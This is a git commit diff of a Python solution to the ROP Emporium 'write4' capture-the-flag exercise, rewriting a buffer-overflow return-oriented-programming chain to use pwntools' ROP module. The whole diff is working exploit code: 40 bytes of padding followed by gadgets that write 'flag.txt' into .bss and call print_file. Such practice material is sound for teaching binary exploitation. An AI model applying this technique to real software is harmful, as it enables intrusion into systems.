0a2efbbe5e64eaf1a1b4205ad1bdcd78d9fcfdb5
Frank Nguyen <fnguyen2000@hotmail.com>
2020-10-18 11:39:28 +1100

    Add solution with pwntools' ROP module

--- rop_emporium/64-bit/3_write4/write4_sol.py
+++ rop_emporium/64-bit/3_write4/write4_sol.py
@@ -22,14 +22,25 @@ pop_rdi = pwn.pack(0x0000000000400693) # pop rdi; ret;
 bss = pwn.pack(0x00601040) # __bss_start
 print_file = pwn.pack(elf.sym['print_file'])
 p.recvuntil(">")
-payload = b"A"*40 +\
-          pop_r14_r15 +\
-          bss +\
-          pwn.pack(0x7478742e67616c66) +\
-          mov_qword +\
-          pop_rdi +\
-          bss +\
-          print_file
+
+rop = pwn.ROP(elf)
+rop.call(pop_r14_r15)
+rop.call(bss)
+rop.call(0x7478742e67616c66)
+rop.call(mov_qword)
+rop.call(pop_rdi)
+rop.call(bss)
+rop.call(print_file)
+
+payload = b"A"*40 + rop.chain()
+#payload = b"A"*40 +\
+#          pop_r14_r15 +\
+#          bss +\
+#          pwn.pack(0x7478742e67616c66) +\
+#          mov_qword +\
+#          pop_rdi +\
+#          bss +\
+#          print_file
 
 p.sendline(payload)
 
